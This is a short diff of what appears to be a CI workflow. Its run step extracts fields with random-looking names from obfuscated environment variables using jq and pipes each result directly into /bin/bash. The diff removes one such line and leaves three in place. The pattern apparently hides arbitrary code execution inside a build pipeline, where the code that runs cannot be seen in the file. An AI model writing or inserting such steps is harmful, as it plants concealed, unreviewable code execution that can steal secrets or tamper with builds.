@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$mbe2801" | jq -r .yk1540 | /bin/bash
           echo $gql0111 | jq -r .oalk58298 | /bin/bash
-          printf '%s' "$q145" | jq -r .qrzu5 | /bin/bash
           echo $ljne5 | jq -r .mkt0776 | /bin/bash
 
       - name: Upload results
